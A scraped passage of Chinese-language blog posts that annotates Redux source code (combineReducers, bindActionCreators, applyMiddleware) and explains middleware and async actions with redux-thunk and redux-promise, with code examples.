state进行初始化。这个初始化跟通过普通的reducer进行初始化没多大区别。举例来说，如果 initialState.todos = undefined，那么 TodoReducer(state, action)初始传入的state就是undefined；如果initialState.todos = []，那么 TodoReducer(state, action)初始传入的state就是[] store.dispatch(action)，finalReducers 里面，会遍历整个reducerMap，依次调用每个reducer，并将每个reducer返回的子state赋给state对应的key。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163import &#123; ActionTypes &#125; from '../createStore';import isPlainObject from '../utils/isPlainObject';import mapValues from '../utils/mapValues';import pick from '../utils/pick';/* eslint-disable no-console */function getUndefinedStateErrorMessage(key, action) &#123; var actionType = action &amp;&amp; action.type; var actionName = actionType &amp;&amp; `\"$&#123;actionType.toString()&#125;\"` || 'an action'; return ( `Reducer \"$&#123;key&#125;\" returned undefined handling $&#123;actionName&#125;. ` + `To ignore an action, you must explicitly return the previous state.` );&#125;function getUnexpectedStateKeyWarningMessage(inputState, outputState, action) &#123; var reducerKeys = Object.keys(outputState); var argumentName = action &amp;&amp; action.type === ActionTypes.INIT ? 'initialState argument passed to createStore' : 'previous state received by the reducer'; if (reducerKeys.length === 0) &#123; return ( 'Store does not have a valid reducer. Make sure the argument passed ' + 'to combineReducers is an object whose values are reducers.' ); &#125; if (!isPlainObject(inputState)) &#123; return ( `The $&#123;argumentName&#125; has unexpected type of \"` + (&#123;&#125;).toString.call(inputState).match(/\\s([a-z|A-Z]+)/)[1] + `\". Expected argument to be an object with the following ` + `keys: \"$&#123;reducerKeys.join('\", \"')&#125;\"` ); &#125; var unexpectedKeys = Object.keys(inputState).filter( key =&gt; reducerKeys.indexOf(key) &lt; 0 ); if (unexpectedKeys.length &gt; 0) &#123; return ( `Unexpected $&#123;unexpectedKeys.length &gt; 1 ? 'keys' : 'key'&#125; ` + `\"$&#123;unexpectedKeys.join('\", \"')&#125;\" found in $&#123;argumentName&#125;. ` + `Expected to find one of the known reducer keys instead: ` + `\"$&#123;reducerKeys.join('\", \"')&#125;\". Unexpected keys will be ignored.` ); &#125;&#125;// 对reducer做合法性检测// store = Redux.createStore(reducer, initialState) --&gt;// currentState = initialState// currentState = currentReducer(currentState, action);//// 从调用关系,调用时机来看, store.getState() 的初始值(currentState)// 为 currentReducer(initialState, &#123; type: ActionTypes.INIT &#125;)//// 1. 在初始化阶段,reducer 传入的 state 值是 undefined,此时,需要返回初始state,且初始state不能为undefined// 2. 当传入不认识的 actionType 时, reducer(state, &#123;type&#125;) 返回的不能是undefined// 3. redux/ 这个 namespace 下的action 不应该做处理,直接返回 currentState 就行 (谁运气这么差会去用这种actionType...)function assertReducerSanity(reducers) &#123; Object.keys(reducers).forEach(key =&gt; &#123; var reducer = reducers[key]; var initialState = reducer(undefined, &#123; type: ActionTypes.INIT &#125;); if (typeof initialState === 'undefined') &#123; throw new Error( `Reducer \"$&#123;key&#125;\" returned undefined during initialization. ` + `If the state passed to the reducer is undefined, you must ` + `explicitly return the initial state. The initial state may ` + `not be undefined.` ); &#125; var type = '@@redux/PROBE_UNKNOWN_ACTION_' + Math.random().toString(36).substring(7).split('').join('.'); if (typeof reducer(undefined, &#123; type &#125;) === 'undefined') &#123; throw new Error( `Reducer \"$&#123;key&#125;\" returned undefined when probed with a random type. ` + `Don't try to handle $&#123;ActionTypes.INIT&#125; or other actions in \"redux/*\" ` + `namespace. They are considered private. Instead, you must return the ` + `current state for any unknown actions, unless it is undefined, ` + `in which case you must return the initial state, regardless of the ` + `action type. The initial state may not be undefined.` ); &#125; &#125;);&#125;/** * Turns an object whose values are different reducer functions, into a single * reducer function. It will call every child reducer, and gather their results * into a single state object, whose keys correspond to the keys of the passed * reducer functions. * * @param &#123;Object&#125; reducers An object whose values correspond to different * reducer functions that need to be combined into one. One handy way to obtain * it is to use ES6 `import * as reducers` syntax. The reducers may never return * undefined for any action. Instead, they should return their initial state * if the state passed to them was undefined, and the current state for any * unrecognized action. * * @returns &#123;Function&#125; A reducer function that invokes every reducer inside the * passed object, and builds a state object with the same shape. */export default function combineReducers(reducers) &#123; // 返回一个对象, key =&gt; value 且value是function(其实就是过滤掉非function) var finalReducers = pick(reducers, (val) =&gt; typeof val === 'function'); var sanityError; try &#123; // 对所有的子reducer 做一些合法性断言,如果没有出错再继续下面的处理 // 合法性断言的内容,见API注释 assertReducerSanity(finalReducers); &#125; catch (e) &#123; sanityError = e; &#125; // 所有的 key: value,将value置成了undefined,费解... // 总而言之, 初始state 就是 类似 &#123;hello: undefined, world: undefined&#125; 的东东 // TODO 确认这里的逻辑 var defaultState = mapValues(finalReducers, () =&gt; undefined); return function combination(state = defaultState, action) &#123; if (sanityError) &#123; throw sanityError; &#125; var hasChanged = false; // 这段代码,简单的说,就是循环一遍 finalState[key] = fn(reducer, key) var finalState = mapValues(finalReducers, (reducer, key) =&gt; &#123; var previousStateForKey = state[key]; var nextStateForKey = reducer(previousStateForKey, action); if (typeof nextStateForKey === 'undefined') &#123; // 其他一个reducer返回的是undefined,于是挂啦...抛出错误 var errorMessage = getUndefinedStateErrorMessage(key, action); throw new Error(errorMessage); &#125; // 这段代码有些费解,从redux的设计理念上来讲,除了不认识的action type,其他情况都应该返回全新的state // 也就是说 // 1. action type 认识,返回新的state,于是这里 hasChanged 为 true // 2. action type 不认识,返回原来的state,于是这里 hasChanged 为 false // 3. 不管action type 是否认识, 在原来的state上修改,但是返回的是修改后的state(没有返回拷贝),那么,hasChanged还是为false hasChanged = hasChanged || nextStateForKey !== previousStateForKey; return nextStateForKey; &#125;); // 开发环境中(于是记得在生产环境去掉) // 后面再研究这段代码,毕竟不是主线路... if (process.env.NODE_ENV !== 'production') &#123; var warningMessage = getUnexpectedStateKeyWarningMessage(state, finalState, action); if (warningMessage) &#123; console.error(warningMessage); &#125; &#125; return hasChanged ? finalState : state; &#125;;&#125; 四、bindActionCreator.js https://github.com/reactjs/redux/blob/master/src/bindActionCreators.js 先看个简单例子可能方便理解一些 1234567891011121314151617181920212223242526272829303132333435363738394041424344var addTodo = function(text)&#123; return &#123; type: 'add_todo', text: text &#125;;&#125;;var addTodos = function()&#123; return &#123; type: 'add_todos', items: Array.prototype.slice.call(arguments, 0) &#125;;&#125;;var reducer = function(state, action)&#123; switch (action.type) &#123; case 'add_todo': return state.concat(action.text); case 'add_todos': return state.concat(action.items); default: return state; &#125;&#125;;var store = redux.createStore(reducer, []);// 注意,关键代码在这里var actions = redux.bindActionCreators(&#123; addTodo: addTodo, addTodos: addTodos&#125;, store.dispatch);console.log('state is: ' + store.getState());store.dispatch(&#123;type: 'add_todo', text: '读书'&#125;);store.dispatch(&#123;type: 'add_todos', items: ['阅读', '睡觉']&#125;);console.log('state is: ' + store.getState()); // state is: 读书,阅读,睡觉actions.addTodo('看电影');console.log('state is: ' + store.getState()); // state is: 读书,阅读,睡觉,看电影actions.addTodos(['刷牙', '洗澡']);console.log('state is: ' + store.getState()); // state is: 读书,阅读,睡觉,看电影,刷牙,洗澡 直接看代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import mapValues from '../utils/mapValues';function bindActionCreator(actionCreator, dispatch) &#123; return (...args) =&gt; dispatch(actionCreator(...args));&#125;/** * Turns an object whose values are action creators, into an object with the * same keys, but with every function wrapped into a `dispatch` call so they * may be invoked directly. This is just a convenience method, as you can call * `store.dispatch(MyActionCreators.doSomething())` yourself just fine. * * For convenience, you can also pass a single function as the first argument, * and get a function in return. * * @param &#123;Function|Object&#125; actionCreators An object whose values are action * creator functions. One handy way to obtain it is to use ES6 `import * as` * syntax. You may also pass a single function. * * @param &#123;Function&#125; dispatch The `dispatch` function available on your Redux * store. * * @returns &#123;Function|Object&#125; The object mimicking the original object, but with * every action creator wrapped into the `dispatch` call. If you passed a * function as `actionCreators`, the return value will also be a single * function. */// 假设 actionCreators === &#123;addTodo: addTodo, removeTodo: removeTodo&#125;// 简单的来说 bindActionCreators(actionCreators, dispatch)// 最后返回的是:// &#123;// addTodo: function(text)&#123;// dispatch( actionCreators.addTodo(text) );// &#125;,// removeTodo: function(text)&#123;// dispatch( actionCreators.removeTodo(text) );// &#125;// &#125;//// 或者说 actionCreators === addTodo (addTodo 为 actionCreator)// 最后返回的是// function() &#123;// dispatch(actionCreators());// &#125;export default function bindActionCreators(actionCreators, dispatch) &#123; if (typeof actionCreators === 'function') &#123; return bindActionCreator(actionCreators, dispatch); &#125; if (typeof actionCreators !== 'object' || actionCreators === null || actionCreators === undefined) &#123; // eslint-disable-line no-eq-null throw new Error( `bindActionCreators expected an object or a function, instead received $&#123;actionCreators === null ? 'null' : typeof actionCreators&#125;. ` + `Did you write \"import ActionCreators from\" instead of \"import * as ActionCreators from\"?` ); &#125; return mapValues(actionCreators, actionCreator =&gt; bindActionCreator(actionCreator, dispatch) );&#125; 五、applyMiddleware.js https://github.com/reactjs/redux/blob/master/src/applyMiddleware.js 中间件应该是redux源码里面最绕的一部分 例子：redux-thunk 123456export default function thunkMiddleware(&#123; dispatch, getState &#125;) &#123; return next =&gt; action =&gt; typeof action === 'function' ? action(dispatch, getState) : next(action);&#125; 123456789101112//es5function thunkMiddleware(store) &#123; var dispatch = store.dispatch; var getState = store.getState; return function (next) &#123; return function (action) &#123; return typeof action === 'function' ? action(dispatch, getState) : next(action); &#125;; &#125;;&#125; 自定义中间件：logger 先看logger的实现 1234567function middleware(store)&#123; return function(next)&#123; return function(action)&#123; return next(action); &#125; &#125;&#125; 基本看出中间件声明的模版来了，就是下面这个样子。下面结合applyMiddleware的调用，来说明store、next、action 几个参数。 12345678910function logger(store)&#123; return function(next)&#123; return function(action)&#123; console.log('logger: dispatching ' + action.type); var result = next(action); console.log('logger: next state ' + result); return result; &#125; &#125;&#125; applyMiddleware调用例子 applyMiddleware 的调用方式为 applyMiddleware(...middlewares)(react.createStore)。其实这里直接先创建 store，然后applyMiddleware(...middlewares)(store) 也很容易实现相同的效果，不过作者是故意这样设计的，为了避免在同一个store上多次应用同一个middlerware 中间件顶层的store参数，并不是常规的store，虽然它也有 getState、dispatch 两个方法 12345678// 上面的store参数，其实就是这个对象// 其中，store 为内部的store，我们在外面 storeWithMiddleWare.dipatch的时候，内部实现是转成 store.dispatch// 此外，可以看到 middlewareAPI.dispatch 方法，是最终封装后的dispatch（千万注意，如果在中间件内部 调用 store.dispatch，可能导致死循环 ）var middlewareAPI = &#123; getState: store.getState, // 最后面, dispatch 被覆盖, 变成包装后的 dispatch 方法 dispatch: (action) =&gt; dispatch(action)&#125;; 第二层的next函数，其实是一个“dispatch”方法 storeWithMiddleWare.dispatch(action) 的时候，会顺序进入各个中间件（按照定义时的顺序）。从当前的例子来看，大约如下，其实就是柯里化啦 1storeWithMiddleWare.dispatch(action) --&gt; logger(store)(next)(action) --&gt; timer(store)(next)(action) --&gt; store.dispatch(action) 完整的示例代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function reducer(state, action)&#123; if(typeof state==='undefined') state = []; switch(action.type)&#123; case 'add_todo': return state.concat(action.text); default: return state; &#125;&#125;function addTodo(text)&#123; return &#123; type: 'add_todo', text: text &#125;;&#125;// 这里的 store，并不是 redux.createStore(reducer, initialState) 出来的 store// 而是 &#123;getState: store.getState, dispatch: function() &#123; store.dispatch(action); &#125;&#125;// function logger(store)&#123; // return function(next)&#123; return function(action)&#123; console.log('logger: dispatching ' + action.type); var result = next(action); console.log('logger: next state ' + result); return result; &#125; &#125;&#125;function timer(store)&#123; return function(next)&#123; return function(action)&#123; console.log('timer: dispatching ' + action.type); var result = next(action); console.log('timer: next state ' + result); return result; &#125; &#125;&#125;var createStoreWidthMiddleware = redux.applyMiddleware( logger, timer )(redux.createStore);var storeWithMiddleWare = createStoreWidthMiddleware(reducer);storeWithMiddleWare.subscribe(function()&#123; console.log('subscribe: state is : ' + storeWithMiddleWare.getState());&#125;);console.log( storeWithMiddleWare.dispatch(addTodo('reading')) ); 源码解析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import compose from './compose';/** * Creates a store enhancer that applies middleware to the dispatch method * of the Redux store. This is handy for a variety of tasks, such as expressing * asynchronous actions in a concise manner, or logging every action payload. * * See `redux-thunk` package as an example of the Redux middleware. * * Because middleware is potentially asynchronous, this should be the first * store enhancer in the composition chain. * * Note that each middleware will be given the `dispatch` and `getState` functions * as named arguments. * * @param &#123;...Function&#125; middlewares The middleware chain to be applied. * @returns &#123;Function&#125; A store enhancer applying the middleware. *//* 从调用方法 applyMiddleware(...middlewares)(Redux.createStore) 可以看出 next 参数实际上是 Redux.createStore. 而 Redux.createStore 的调用方式为 Redux.createStore(reducer, initialState) 所以 applyMiddleware(...middlewares) 1. 参数: Redux.createStore 2. 返回值:一个function, 跟 Redux.createStore 接受的参数一样 */export default function applyMiddleware(...middlewares) &#123; return (next) =&gt; (reducer, initialState) =&gt; &#123; // 内部先创建一个store (相当于直接调用 Redux.createStore(reducer, initialState)) var store = next(reducer, initialState); // 保存最初始的store.dispatch var dispatch = store.dispatch; var chain = []; var middlewareAPI = &#123; getState: store.getState, // 最后面, dispatch 被覆盖, 变成包装后的 dispatch 方法 dispatch: (action) =&gt; dispatch(action) &#125;; // 返回一个数组 // 贴个例子在这里做参考,redux-thunk // function thunkMiddleware(store) &#123; // var dispatch = store.dispatch; // var getState = store.getState; // // 这里的next其实就是dispatch // return function (next) &#123; // return function (action) &#123; // return typeof action === 'function' ? action(dispatch, getState) : next(action); // &#125;; // &#125;; //&#125; /* chain 是个数组, 参考上面的 middlleware (redux-thunk),可以看到,chain的每个元素为如下形式的function 并且, 传入的 store.getState 为原始的 store.getState,而 dispatch则是包装后的 dispatch(不是原始的store.dispatch) 似乎是为了确保, 在每个middleware里调用 dispatch(action), 最终都是 用原始的 store.dispatch(action) 避免 store.dispatch 被覆盖, 导致middleware 顺序调用的过程中, store.dispatch的值变化 --&gt; store.dispatch 返回的值可能会有不同 违背 redux 的设计理念 这里的 next 则为 原始的 store.dispatch (见下面 compose(...chain)(store.dispatch) ) function (next) &#123; return function (action) &#123; &#125; &#125; */ chain = middlewares.map(middleware =&gt; middleware(middlewareAPI)); // compose(...chain)(store.dispatch) 返回了一个function // 伪代码如下, // function (action) &#123; // middleware(store)(store.dispatch); // &#125; dispatch = compose(...chain)(store.dispatch); // 从右到左, middleware1( middleware2( middleware3(dispatch) ) ) // 于是,最终调用 applyMiddleware(...middlewares)(Redux.createStore) // 返回的 store, getState,subscribe 方法都是原始的那个 store.getState, store.subscribe // 至于dispatch是封装过的 return &#123; ...store, dispatch &#125;; &#125;;&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"Redux之浅析中间件（八）","slug":"2017-11-react-study-middleware","date":"2017-11-19T08:30:26.000Z","updated":"2018-10-24T03:46:02.268Z","comments":true,"path":"note/f50d087a.html","link":"","permalink":"https://ru23.com/note/f50d087a.html","excerpt":"","text":"一、前言 在redux里，middleware是发送action和action到达reducer之间的第三方扩展，也就是中间层。也可以这样说，middleware是架在action和store之间的一座桥梁 在redux里，action仅仅是携带了数据的普通js对象 Reducer 拆分可以使组件获取其最小属性(state)，而不需要整个Store。中间件则可以在Action Creator 返回最终可供 dispatch 调用的 action 之前处理各种事情，如异步API调用、日志记录等，是扩展 Redux 功能的一种推荐方式 Redux 提供了 applyMiddleware(...middlewares) 来将中间件应用到 createStore。applyMiddleware 会返回一个函数，该函数接收原来的 creatStore 作为参数，返回一个应用了 middlewares 的增强后的 creatStore 123456789101112131415161718192021222324export default function applyMiddleware(...middlewares) &#123; return (createStore) =&gt; (reducer, preloadedState, enhancer) =&gt; &#123; //接收createStore参数 var store = createStore(reducer, preloadedState, enhancer) var dispatch = store.dispatch var chain = [] //传递给中间件的参数 var middlewareAPI = &#123; getState: store.getState, dispatch: (action) =&gt; dispatch(action) &#125; //注册中间件调用链 chain = middlewares.map(middleware =&gt; middleware(middlewareAPI)) dispatch = compose(...chain)(store.dispatch) //返回经middlewares增强后的createStore return &#123; ...store, dispatch &#125; &#125;&#125; 未应用中间价之前，创建 store 的方式如下 1234import &#123;createStore&#125; from 'redux';import reducers from './reducers/index';export let store = createStore(reducers); 应用中间价之后，创建 store的方式如下 12345import &#123;createStore，applyMiddleware&#125; from 'redux';import reducers from './reducers/index';let createStoreWithMiddleware = applyMiddleware(...middleware)(createStore);export let store = createStoreWithMiddleware(reducers); 二、为什么要引入middleware action creator返回的值是这个action类型的对象。然后通过store.dispatch()进行分发 1action ---&gt; dispatcher ---&gt; reducers 如果遇到异步情况，比如点击一个按钮，希望2秒之后更新视图，显示消息“Hi”。我们可能这么写ActionCreator 12345678var asyncSayActionCreator = function (message) &#123; setTimeout(function () &#123; return &#123; type: 'SAY', message &#125; &#125;, 2000)&#125; 这会报错，因为这个asyncSayActionCreator返回的不是一个action，而是一个function。这个返回值无法被reducer识别 也就是说，正常来说，action返回的是一个对象，而不是一个函数。如果返回函数，会出现错误 而异步操作呢，需要action的返回值是一个函数。那么咋办呢，所以需要引入中间件middleware,它在中间起到了桥梁的作用，让action的返回值可以是一个函数，从而传到reducer那里。也就是说，中间件是用在action发起之后，reducer接收到之前的这个时间段 也可以这么说，Middleware 主要是负责改变Store中的dispatch方法，从而能处理不同类型的 action 输入，得到最终的 Javascript Plain Object 形式的 action 对象 因此，上面那个ActionCreator就可以改写为这样：因为action的返回值是一个函数 12345678910var asyncSayActionCreator = function (message) &#123; return function (dispatch) &#123; setTimeout(function () &#123; dispatch(&#123; type: 'SAY', message &#125;) &#125;, 2000) &#125;&#125; image.png 上图表达的是 redux 中一个简单的同步数据流动的场景，点击button 后，在回调中 dispatch 一个 action，reducer 收到action 后，更新 state 并通知 view 重新渲染 上面这张图展示了应用middleware 后 redux 处理事件的逻辑，每一个 middleware 处理一个相对独立的业务需求，通过串联不同的 middleware，实现变化多样的的功能。那么问题来了： middleware 怎么写？ redux是如何让 middlewares 串联并跑起来的？ 三、中间件是如何工作的 Middleware的中间件有很多，不过我的这个案例只引用了其中的一个，那就是redux-thunk redux-thunk源码如下 123456export default function thunkMiddleware(&#123; dispatch, getState &#125;) &#123; return next =&gt; action =&gt; typeof action === 'function' ? action(dispatch, getState) : next(action);&#125; 意思是如果action是一个函数，执行这个action函数，如果不是函数，执行next函数 四、自定义中间件 中间件的签名如下 1(&#123; getState, dispatch &#125;) =&gt; next =&gt; action 根据applyMiddleware 源码，每个中间件接收 getState &amp; dispatch作为参数，并返回一个函数，该函数会被传入下一个中间件的 dispatch 方法，并返回一个接收 action 的新函数 应用多个中间件时，中间件调用链中任何一个缺少 next(action) 的调用，都会导致action 执行失败 123456function callTraceMiddleware (&#123;dispatch,getState&#125;)&#123; return next=&gt; action =&gt;&#123; console.trace(); return next(action); &#125;&#125; 然后在调用中间件部分添加中间件 12345const createStoreWithMiddleware = applyMiddleware( thunkMiddleware, loggerMiddleware, callTraceMiddleware)(createStore); redux的middleware是对action进行扩展处理，这样丰富了应用需求","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"Redux之异步Action及操作（七）","slug":"2017-11-redux-study-async-operation","date":"2017-11-19T02:17:25.000Z","updated":"2018-10-24T03:46:02.280Z","comments":true,"path":"note/9e9b2557.html","link":"","permalink":"https://ru23.com/note/9e9b2557.html","excerpt":"","text":"一、创建同步Action Action是数据从应用传递到 store/state 的载体，也是开启一次完成数据流的开始 普通的action对象 123456const action = &#123; type:'ADD_TODO', name:'poetries'&#125;dispatch(action) 封装action creator 12345678function actionCreator(data)&#123; return &#123; type:'ADD_TODO', data:data &#125;&#125;dispatch(actionCreator('poetries')) bindActionCreators合并 1234567891011121314151617181920function a(name,id)&#123; reurn &#123; type:'a', name, id &#125;&#125;function b(name,id)&#123; reurn &#123; type:'b', name, id &#125;&#125;let actions = Redux.bindActionCreators(&#123;a,b&#125;,store.dispatch)//调用actions.a('poetries','id001')actions.b('jing','id002') action创建的标准 在Flux的架构中，一个Action要符合 FSA(Flux Standard Action) 规范，需要满足如下条件 是一个纯文本对象 只具备 type 、payload、error 和 meta中的一个或者多个属性。type 字段不可缺省，其它字段可缺省 若 Action 报错，error 字段不可缺省，切必须为 true payload 是一个对象，用作Action携带数据的载体 标准action示例 A basic Flux Standard Action: 123456&#123; type: 'ADD_TODO', payload: &#123; text: 'Do something.' &#125;&#125; An FSA that represents an error, analogous to a rejected Promise 12345&#123; type: 'ADD_TODO', payload: new Error(), error: true&#125; https://github.com/acdlite/flux-standard-action 可以采用如下一个简单的方式检验一个Action是否符合FSA标准 1234// every有一个匹配不到返回falselet isFSA = Object.keys(action).every((item)=&gt;&#123; return ['payload','type','error','meta'].indexOf(item) &gt; -1&#125;) 二、创建异步action的多种方式 最简单的方式就是使用同步的方式来异步，将原来同步时一个action拆分成多个异步的action的，在异步开始前、异步请求中、异步正常返回（异常）操作分别使用同步的操作，从而模拟出一个异步操作了。这样的方式是比较麻烦的，现在已经有redux-saga等插件来解决这些问题了 异步action的实现方式一：setTimeout redux-thunk中间处理解析 12345678910function thunkAction(data) &#123; reutrn (dispatch)=&gt;&#123; setTimeout(function()&#123; dispatch(&#123; type:'ADD_TODO', data &#125;) &#125;,3000) &#125;&#125; 异步action的实现方式二：promise实现异步action redux-promise中间处理这种action 123456789101112131415function promiseAction(name)&#123; return new Promise((resolve,reject) =&gt; &#123; setTimeout((param)=&gt;&#123; resolve(&#123; type:'ADD_TODO', name &#125;) &#125;,3000) &#125;).then((param)=&gt;&#123; dispatch(action(\"action2\")) return; &#125;).then((param)=&gt;&#123; dispatch(action(\"action3\")) &#125;)&#125; 三、redux异步流程 image.png 首先发起一个action，然后通过中间件，这里为什么要用中间件呢，因为这样dispatch的返回值才能是一个函数。 通过store.dispatch，将状态的的改变传给store的小弟reducer，reducer根据action的改变，传递新的状态state。 最后将所有的改变告诉给它的大哥，store。store保存着所有的数据，并将数据注入到组件的顶部，这样组件就可以获得它需要的数据了 四、Redux异步方案选型redux-thunk Redux本身只能处理同步的Action，但可以通过中间件来拦截处理其它类型的action，比如函数(Thunk)，再用回调触发普通Action，从而实现异步处理 发送异步的action其实是被中间件捕获的，函数类型的action就被middleware捕获。至于怎么定义异步的action要看你用哪个中间件，根据他们的实例来定义，这样才会正确解析action Redux 本身不处理异步行为，需要依赖中间件。结合 redux-actions 使用，Redux 有两个推荐的异步中间件 redux-thunk redux-promise redux-thunk 的源码如下 1234567891011121314function createThunkMiddleware(extraArgument) &#123; return (&#123; dispatch, getState &#125;) =&gt; next =&gt; action =&gt; &#123; if (typeof action === 'function') &#123; return action(dispatch, getState, extraArgument); &#125; return next(action); &#125;;&#125;const thunk = createThunkMiddleware();thunk.withExtraArgument = createThunkMiddleware;export default thunk; 源码可知，action creator 需要返回一个函数给 redux-thunk 进行调用，示例如下 1234567891011export let addTodoWithThunk = (val) =&gt; async (dispatch, getState)=&gt;&#123; //请求之前的一些处理 let value = await Promise.resolve(val + ' thunk'); dispatch(&#123; type:CONSTANT.ADD_TO_DO_THUNK, payload:&#123; value &#125; &#125;);&#125;; 而它使用起来最大的问题，就是重复的模板代码太多 1234567891011121314151617181920212223242526272829303132333435363738//action typesconst GET_DATA = 'GET_DATA', GET_DATA_SUCCESS = 'GET_DATA_SUCCESS', GET_DATA_FAILED = 'GET_DATA_FAILED'; //action creatorconst getDataAction = (id) =&gt; (dispatch, getState) =&gt; &#123; dispatch(&#123; type: GET_DATA, payload: id &#125;) api.getData(id) //注：本文所有示例的api.getData都返回promise对象 .then(response =&gt; &#123; dispatch(&#123; type: GET_DATA_SUCCESS, payload: response &#125;) &#125;) .catch(error =&gt; &#123; dispatch(&#123; type: GET_DATA_FAILED, payload: error &#125;) &#125;) &#125;&#125;//reducerconst reducer = (oldState, action) =&gt; &#123; switch(action.type) &#123; case GET_DATA : return oldState; case GET_DATA_SUCCESS : return successState; case GET_DATA_FAILED : return errorState; &#125;&#125; 这已经是最简单的场景了，请注意：我们甚至还没写一行业务逻辑，如果每个异步处理都像这样，重复且无意义的工作会变成明显的阻碍 另一方面，像GET_DATA_SUCCESS、GET_DATA_FAILED这样的字符串声明也非常无趣且易错上例中，GET_DATA这个action并不是多数场景需要的 redux-promise 由于redux-thunk写起来实在是太麻烦了，社区当然会有其它轮子出现。redux-promise则是其中比较知名的 它自定义了一个middleware，当检测到有action的payload属性是Promise对象时，就会 若resolve，触发一个此action的拷贝，但payload为promise的value，并设status属性为&quot;success&quot; 若reject，触发一个此action的拷贝，但payload为promise的reason，并设status属性为&quot;error&quot; 12345678910111213141516171819202122//action typesconst GET_DATA = 'GET_DATA';//action creatorconst getData = function(id) &#123; return &#123; type: GET_DATA, payload: api.getData(id) //payload为promise对象 &#125;&#125;//reducerfunction reducer(oldState, action) &#123; switch(action.type) &#123; case GET_DATA: if (action.status === 'success') &#123; return successState &#125; else &#123; return errorState &#125; &#125;&#125; redux-promise为了精简而做出的妥协非常明显：无法处理乐观更新 场景解析之：乐观更新 多数异步场景都是悲观更新的，即等到请求成功才渲染数据。而与之相对的乐观更新，则是不等待请求成功，在发送请求的同时立即渲染数据 由于乐观更新发生在用户操作时，要处理它，意味着必须有action表示用户的初始动作 在上面redux-thunk的例子中，我们看到了GET_DATA, GET_DATA_SUCCESS、GET_DATA_FAILED三个action，分别表示初始动作、异步成功和异步失败，其中第一个action使得redux-thunk具备乐观更新的能力 而在redux-promise中，最初触发的action被中间件拦截然后过滤掉了。原因很简单，redux认可的action对象是 plain JavaScript objects，即简单对象，而在redux-promise中，初始action的payload是个Promise redux-promise-middleware redux-promise-middleware相比redux-promise，采取了更为温和和渐进式的思路，保留了和redux-thunk类似的三个action 12345678910111213141516171819202122232425262728//action typesconst GET_DATA = 'GET_DATA', GET_DATA_PENDING = 'GET_DATA_PENDING', GET_DATA_FULFILLED = 'GET_DATA_FULFILLED', GET_DATA_REJECTED = 'GET_DATA_REJECTED'; //action creatorconst getData = function(id) &#123; return &#123; type: GET_DATA, payload: &#123; promise: api.getData(id), data: id &#125; &#125;&#125;//reducerconst reducer = function(oldState, action) &#123; switch(action.type) &#123; case GET_DATA_PENDING : return oldState; // 可通过action.payload.data获取id case GET_DATA_FULFILLED : return successState; case GET_DATA_REJECTED : return errorState; &#125;&#125; 五、redux异步操作代码演示 根据官网的async例子分析 https://github.com/lewis617/react-redux-tutorial/tree/master/redux-examples/async action/index.js 123456789101112131415161718192021222324252627282930313233import fetch from 'isomorphic-fetch'export const RECEIVE_POSTS = 'RECEIVE_POSTS'//获取新闻成功的actionfunction receivePosts(reddit, json) &#123; return &#123; type: RECEIVE_POSTS, reddit: reddit, posts: json.data.children.map(child =&gt;child.data) &#125;&#125;function fetchPosts(subreddit) &#123; return function (dispatch) &#123; return fetch(`http://www.subreddit.com/r/$&#123;subreddit&#125;.json`) .then(response =&gt; response.json()) .then(json =&gt; dispatch(receivePosts(subreddit, json)) ) &#125;&#125;//如果需要则开始获取文章export function fetchPostsIfNeeded(subreddit) &#123; return (dispatch, getState) =&gt; &#123; return dispatch(fetchPosts(subreddit)) &#125;&#125; fetchPostsIfNeeded这里就是一个中间件。redux-thunk会拦截fetchPostsIfNeeded这个action，会先发起数据请求，如果成功，就将数据传给action从而到达reducer那里 reducers/index.js 1234567891011121314151617181920212223242526272829import &#123; combineReducers &#125; from 'redux'import &#123; RECEIVE_POSTS&#125; from '../actions'function posts(state = &#123; items: []&#125;, action) &#123; switch (action.type) &#123; case RECEIVE_POSTS: // Object.assign是ES6的一个语法。合并对象，将对象合并为一个，前后相同的话，后者覆盖强者。详情可以看这里 // https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/assign return Object.assign(&#123;&#125;, state, &#123; items: action.posts //数据都存在了这里 &#125;) default: return state &#125;&#125;// 将所有的reducer结合为一个,传给storeconst rootReducer = combineReducers(&#123; postsByReddit&#125;)export default rootReducer 这个跟正常的reducer差不多。判断action的类型，从而根据action的不同类型，返回不同的数据。这里将数据存储在了items这里。这里的reducer只有一个。最后结合成rootReducer,传给store store/configureStore.js 1234567891011121314151617181920212223import &#123; createStore, applyMiddleware &#125; from 'redux'import thunkMiddleware from 'redux-thunk'import createLogger from 'redux-logger'import rootReducer from '../reducers'const createStoreWithMiddleware = applyMiddleware( thunkMiddleware, createLogger() )(createStore)export default function configureStore(initialState) &#123; const store = createStoreWithMiddleware(rootReducer, initialState) if (module.hot) &#123; // Enable Webpack hot module replacement for reducers module.hot.accept('../reducers', () =&gt; &#123; const nextRootReducer = require('../reducers') store.replaceReducer(nextRootReducer) &#125;) &#125; return store&#125; 我们是如何在 dispatch 机制中引入 Redux Thunk middleware 的呢？我们使用了applyMiddleware() 通过使用指定的 middleware，action creator 除了返回 action 对象外还可以返回函数 这时，这个 action creator 就成为了 thunk 界面上的调用：在containers/App.js 123456//初始化渲染后触发 componentDidMount() &#123; const &#123; dispatch&#125; = this.props // 这里可以传两个值，一个是 reactjs 一个是 frontend dispatch(fetchPostsIfNeeded('frontend')) &#125; 改变状态的时候也是需要通过dispatch来传递的 数据的获取是通过provider,将store里面的数据注入给组件。让顶级组件提供给他们的子孙组件调用。代码如下： 12345678910111213import 'babel-core/polyfill'import React from 'react'import &#123; render &#125; from 'react-dom'import &#123; 